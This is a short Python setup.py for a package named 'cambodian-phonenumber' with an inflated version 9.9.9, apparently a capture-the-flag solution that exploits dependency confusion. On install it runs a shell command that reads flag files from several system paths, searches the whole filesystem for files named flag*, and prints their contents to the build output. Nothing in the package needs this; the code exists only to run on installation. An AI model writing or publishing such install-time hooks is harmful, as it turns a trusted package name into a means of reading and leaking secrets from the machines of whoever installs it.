import subprocess
from setuptools import setup

flag = subprocess.getoutput("cat /flag* /flag.txt /app/flag* /root/flag* 2>/dev/null || find / -name 'flag*' -type f 2>/dev/null | head -5 | xargs cat")
print("==FLAG==", flag, "==FLAG==")

setup(name="cambodian-phonenumber", version="9.9.9")
